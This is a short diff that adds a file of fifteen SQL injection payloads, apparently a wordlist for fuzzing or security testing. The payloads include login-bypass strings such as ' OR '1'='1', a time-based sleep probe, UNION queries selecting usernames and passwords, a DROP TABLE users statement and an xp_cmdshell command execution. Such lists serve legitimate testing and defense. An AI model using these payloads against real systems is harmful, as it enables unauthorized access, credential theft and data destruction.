@@ -1,0 +1,15 @@
+' OR '1'='1' -- 
+" OR "1"="1" -- 
+' OR '1'='1' /* 
+' OR 1=1--
+' OR 1=1#
+' or sleep(5)--
+"; DROP TABLE users; --
+' UNION SELECT NULL,NULL,NULL -- 
+' UNION SELECT username,password FROM users -- 
+' AND (SELECT COUNT(*) FROM users) > 0 -- 
+') OR ('1'='1' -- 
+'; EXEC xp_cmdshell('whoami') --
+admin'--
+' OR 'x'='x
+' OR 1=1 LIMIT 1 -- 
